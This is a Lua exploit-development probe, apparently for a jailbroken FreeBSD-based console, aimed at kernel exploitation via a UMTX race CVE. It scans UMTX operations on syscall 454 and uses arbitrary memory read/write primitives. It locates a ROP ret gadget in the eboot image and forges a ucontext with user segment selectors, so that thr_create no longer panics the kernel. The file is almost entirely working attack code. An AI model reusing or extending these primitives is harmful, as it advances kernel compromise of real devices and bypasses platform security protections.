-- CRASH_CLASS: HIGH
-- PROBE 56m: Full UMTX op scan + thr_create CS=0x43 fix
--
-- Context: 56l confirmed UMTX_OP_SHM works on syscall 454 but output truncated.
-- CVE-2024-43102 needs concurrent threads to exploit the race.
-- thr_create(430) panics kernel because set_mcontext() copies CS=0 from zeroed
-- ucontext. Fix: set CS=0x43, SS=0x3B to produce user-mode thread.
-- This probe: (A) scan all UMTX ops, (B) attempt thr_create with CS=0x43.

print("=== PROBE 56m: UMTX OPS + THR_CREATE FIX ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

collectgarbage("stop")

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

-- ============================================================
-- SECTION A: Complete UMTX op scan (ops 0-31)
-- ============================================================
print("")
print("--- A: UMTX OP SCAN (454) ---")

local sc_umtx = make_syscall(454)
local umtx_obj = memory.alloc(0x100)

-- Initialize umtx_obj to various values for different ops
-- Some ops expect specific object states
for op = 0, 31 do
    safe_wq(umtx_obj, uint64(0))

    local ok, ret = pcall(function()
        return sc_umtx(uint64(to_num(umtx_obj)), uint64(op), uint64(0), uint64(0), uint64(0))
    end)

    local rn = -999
    if ok then rn = to_num(ret) end

    local status = "FAIL"
    if not ok then
        status = "PCALL_FAIL"
    elseif rn == 0 then
        status = "OK(0)"
    elseif rn == -1 then
        status = "ENOSYS(-1)"
    else
        status = string.format("ret=%d", rn)
    end

    print(string.format("  op=%2d: %s", op, status))
end

-- ============================================================
-- SECTION B: thr_create with CS=0x43 fix
-- ============================================================
print("")
print("--- B: THR_CREATE CS=0x43 FIX ---")

-- thr_create(ucontext_t *ctx, long *id, int flags)
-- syscall 430
--
-- The key: set CS=0x43 (user code segment) and SS=0x3B (user stack segment)
-- in the mcontext within the ucontext. This should prevent the kernel from
-- treating the new thread's trap as kernel-mode.
--
-- FreeBSD x86_64 ucontext_t layout:
--   +0x00: uc_sigmask (16 bytes - sigset_t)
--   +0x10: uc_mcontext (starts here)
--
-- mcontext_t layout (FreeBSD amd64):
--   +0x00: mc_onstack
--   +0x08: mc_rdi
--   +0x10: mc_rsi
--   +0x18: mc_rdx
--   +0x20: mc_rcx
--   +0x28: mc_r8
--   +0x30: mc_r9
--   +0x38: mc_rax
--   +0x40: mc_rbx
--   +0x48: mc_rbp
--   +0x50: mc_r10
--   +0x58: mc_r11
--   +0x60: mc_r12
--   +0x68: mc_r13
--   +0x70: mc_r14
--   +0x78: mc_r15
--   +0x80: mc_trapno
--   +0x88: mc_fs
--   +0x8C: mc_gs
--   +0x90: mc_addr (or mc_flags)
--   +0x98: mc_flags
--   +0xA0: mc_es
--   +0xA4: mc_ds
--   +0xA8: mc_err
--   +0xB0: mc_rip
--   +0xB8: mc_cs     <-- THIS IS THE KEY: set to 0x43
--   +0xC0: mc_rflags
--   +0xC8: mc_rsp
--   +0xD0: mc_ss     <-- set to 0x3B

-- First, find a safe RIP to jump to
-- We need a simple "ret" gadget or a loop that doesn't crash
-- From the ROP chain data, we have ret gadget
local pipe_str = tostring(syscall.pipe)
print("pipe_str snippet: " .. pipe_str:sub(1, 200))

-- Get eboot base for gadgets
local sc_info = make_syscall(593)
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
pcall(function() sc_info(uint64(0), info) end)
local eboot_lo = safe_rd(info + 0x108)
local eboot_hi = safe_rd(info + 0x10C)
print(string.format("eboot base: 0x%X_%08X", eboot_hi or 0, eboot_lo or 0))

-- Use fcall_with_rax to call getpid to verify ROP works
local stub = syscall.pipe.fn_addr
local ok_gp, ret_gp = pcall(function() return native.fcall_with_rax(stub, 20) end)
print("fcall_with_rax getpid: ok=" .. tostring(ok_gp) .. " ret=" .. tostring(ret_gp))

-- Get the gen_fcall_chain to extract gadget addresses
local ok_gc, chain = pcall(function() return native.gen_fcall_chain(stub, 20) end)
if ok_gc and type(chain) == "table" then
    print("gen_fcall_chain keys:")
    for k, v in pairs(chain) do
        if type(v) ~= "table" then
            print("  " .. tostring(k) .. "=" .. tostring(v))
        end
    end

    -- Look for ret gadget in the chain
    if chain.gadgets then
        print("gadgets type=" .. type(chain.gadgets))
        if type(chain.gadgets) == "table" then
            for k, v in pairs(chain.gadgets) do
                print("  gadget." .. tostring(k) .. "=" .. tostring(v))
            end
        end
    end
end

-- Find ret gadget from eboot - scan for 0xC3 byte
local ret_gadget = nil
if eboot_lo and eboot_hi then
    local eboot_base = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo))
    -- Scan eboot .text for a ret (0xC3) instruction
    -- eboot is RX so we can read it
    local ok_scan, scan_data = pcall(function()
        return native.read_buffer(eboot_base, 256)
    end)
    if ok_scan and scan_data then
        for i = 1, #scan_data do
            if scan_data:byte(i) == 0xC3 then
                ret_gadget = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + i - 1))
                print("Found ret gadget at offset +" .. (i-1) .. " = " .. fmt_addr(ret_gadget))
                break
            end
        end
    end
end

if not ret_gadget then
    print("No ret gadget found in first 256 bytes, using known offset")
    -- From 56j we know ret is at 0x6dd78042
    -- But that's ASLR'd, we need current addresses
    -- Actually the pivot_handler_rop has recover_from_call
    local rop = native.pivot_handler_rop
    if rop and rop.recover_from_call then
        print("recover_from_call=" .. fmt_addr(rop.recover_from_call))
    end
end

-- Now set up the ucontext for thr_create
-- Allocate ucontext (needs to be at least 0x200 bytes)
local uctx = memory.alloc(0x1000)
-- Zero it completely
for i = 0, 0x1FF do
    pcall(function() memory.write_byte(uctx + i, 0) end)
end

-- Allocate a stack for the new thread (64KB)
local sc_mmap = make_syscall(477)
local ok_stk, new_stack = pcall(function()
    return sc_mmap(uint64(0), uint64(0x10000), uint64(3), -- PROT_READ|PROT_WRITE
        uint64(0x1002), -- MAP_PRIVATE|MAP_ANON
        uint64(0xFFFFFFFF), uint64(0))
end)
local stk_h, stk_l = get_hi_lo(new_stack)
print(string.format("thread stack: ok=%s addr=0x%X_%08X", tostring(ok_stk), stk_h, stk_l))

if ok_stk and stk_h ~= 0xFFFFFFFF then
    -- mcontext starts at uctx + 0x10
    local mc = to_num(uctx) + 0x10

    -- Set RIP to a ret gadget (the thread will just return immediately)
    if ret_gadget then
        local rg_h, rg_l = get_hi_lo(ret_gadget)
        safe_wd(mc + 0xB0, rg_l)      -- mc_rip low
        safe_wd(mc + 0xB4, rg_h)      -- mc_rip high
    end

    -- Set CS = 0x43 (user code segment selector with RPL=3)
    safe_wd(mc + 0xB8, 0x43)
    safe_wd(mc + 0xBC, 0)

    -- Set RFLAGS = 0x202 (IF set, reserved bit 1 set)
    safe_wd(mc + 0xC0, 0x202)
    safe_wd(mc + 0xC4, 0)

    -- Set RSP to top of allocated stack (stack grows down)
    local sp_addr = uint64(string.format("0x%X%08X", stk_h, stk_l + 0x10000 - 0x100))
    local sp_h, sp_l = get_hi_lo(sp_addr)
    safe_wd(mc + 0xC8, sp_l)      -- mc_rsp low
    safe_wd(mc + 0xCC, sp_h)      -- mc_rsp high

    -- Set SS = 0x3B (user stack segment selector with RPL=3)
    safe_wd(mc + 0xD0, 0x3B)
    safe_wd(mc + 0xD4, 0)

    -- Set RBP to something valid
    safe_wd(mc + 0x48, sp_l)      -- mc_rbp low
    safe_wd(mc + 0x4C, sp_h)      -- mc_rbp high

    -- Set mc_flags to indicate valid context
    -- MCF_ONSTACK = 0x1 (not needed)
    -- Just set mc_len (mc_onstack field, first 8 bytes) = sizeof(mcontext)
    safe_wd(mc, 0)  -- mc_onstack = 0

    -- Verify the key fields
    print(string.format("mc_rip: 0x%08X_%08X", safe_rd(mc + 0xB4) or 0, safe_rd(mc + 0xB0) or 0))
    print(string.format("mc_cs:  0x%08X_%08X", safe_rd(mc + 0xBC) or 0, safe_rd(mc + 0xB8) or 0))
    print(string.format("mc_rsp: 0x%08X_%08X", safe_rd(mc + 0xCC) or 0, safe_rd(mc + 0xC8) or 0))
    print(string.format("mc_ss:  0x%08X_%08X", safe_rd(mc + 0xD4) or 0, safe_rd(mc + 0xD0) or 0))
    print(string.format("mc_rfl: 0x%08X_%08X", safe_rd(mc + 0xC4) or 0, safe_rd(mc + 0xC0) or 0))

    -- Allocate thread ID output
    local tid_out = memory.alloc(16)
    safe_wq(tid_out, uint64(0))

    -- CRITICAL: thr_create(430)
    -- This previously caused a kernel panic with zeroed context.
    -- With CS=0x43 and SS=0x3B it should produce a user-mode thread.
    print("")
    print("*** CALLING thr_create(430) with CS=0x43 ***")
    print("PRE-CALL canary=" .. to_num(syscall.getpid()))

    local sc_thr_create = make_syscall(430)
    local ok_tc, ret_tc = pcall(function()
        return sc_thr_create(uint64(to_num(uctx)), uint64(to_num(tid_out)), uint64(0))
    end)

    print("POST-CALL marker reached!")
    print("thr_create: ok=" .. tostring(ok_tc) .. " ret=" .. tostring(ret_tc))

    local new_tid = safe_rq(tid_out)
    print("new TID=" .. fmt_addr(new_tid))

    -- If we survived, check if we can still make syscalls
    local post_pid = to_num(syscall.getpid())
    print("POST canary=" .. post_pid)

    -- If thread was created, try to use it
    if ok_tc and to_num(ret_tc) == 0 then
        print("*** THR_CREATE SUCCEEDED WITHOUT PANIC! ***")

        -- Give the thread a moment to execute
        -- (it should just execute ret and exit)

        -- Try thr_kill to check if thread exists
        local sc_thr_kill = make_syscall(433)
        local tid_num = to_num(new_tid)
        if tid_num > 0 then
            local ok_tk, ret_tk = pcall(function()
                return sc_thr_kill(uint64(tid_num), uint64(0))
            end)
            print("thr_kill(tid=" .. tid_num .. ",sig=0): ok=" .. tostring(ok_tk) .. " ret=" .. tostring(ret_tk))
        end
    end
else
    print("Stack allocation failed, skipping thr_create")
end

print("")
print("canary=" .. to_num(syscall.getpid()))
print("=== PROBE 56m COMPLETE ===")
